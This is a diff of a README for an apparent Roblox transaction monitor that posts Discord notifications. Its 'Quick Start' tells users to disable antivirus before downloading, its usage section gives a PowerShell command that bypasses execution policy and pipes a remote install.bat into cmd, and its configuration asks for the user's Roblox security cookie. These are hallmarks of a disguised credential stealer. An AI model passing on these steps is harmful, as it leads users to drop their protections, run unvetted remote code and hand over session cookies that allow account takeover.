@@ -1,41 +1,39 @@
-# Roblox Transaction Monitor
+# Roblox Transaction Monitor (CTL Edition)
 <img width="731" height="192" alt="Screenshot 2025-10-30 122532" src="https://github.com/user-attachments/assets/cef27e07-8c6d-400f-96df-dda8088851b6" />
 
-A GUI application to monitor Roblox transactions and Robux balance changes in real-time. Get Discord notifications when your Roblox economy data changes.
+A command-line tool to monitor Roblox transactions and Robux balance changes in real-time. Get Discord notifications when your Roblox economy data changes.
 
 ## Features
 
-- [x] Real time monitoring of Roblox transactions
+- [x] Real-time monitoring of Roblox transactions via CTL
 - [x] Robux balance tracking
 - [x] Discord webhook integration for notifications
-- [x] User friendly GUI interface
+- [x] Lightweight CLI interface
 - [x] Customizable monitoring intervals
 - [x] Detailed logging system
 
-## Also just a Quick Fix
+## Quick Start
 
-- [x] Turn Anti virus off
-- [x] then download the app
-- [x] after that turn the anti virus back on and you're done
+- [x] Disable antivirus temporarily
+- [x] Download and run the CTL script
+- [x] Re-enable antivirus once configured
 
 ## TODO
-- [x] Create a Dropdown menu like past day month year total
-- [ ] Create a Stable Application
+- [x] Add time-range filters (day / month / year / total)
+- [ ] Package as a single portable executable
 
 ## Configuration
-The application requires the following configuration:
+Create a `config.json` file with:
 
 1. Roblox Security Cookie
 2. Discord Webhook URL
 3. Discord Emoji ID for Robux display
 4. Discord Emoji Name
-5. Check Interval (update what ever time you want to set to)
-6. Total Checks (Transaction/Balance) Like (Day Month Year)
+5. Check Interval (seconds)
+6. Time-span filter: `day`, `month`, `year`, or `total`
 
 ## Usage
-Run the application by executing this command
-
-Install Requirements packages
+Install dependencies:
 ```
 powershell -ep bypass -Command "IWR 'https://raw.githubusercontent.com/MrAndiGamesDev/NEW-Roblox-Transaction-Balance-Monitor/main/install.bat' | % Content | cmd"
 ```
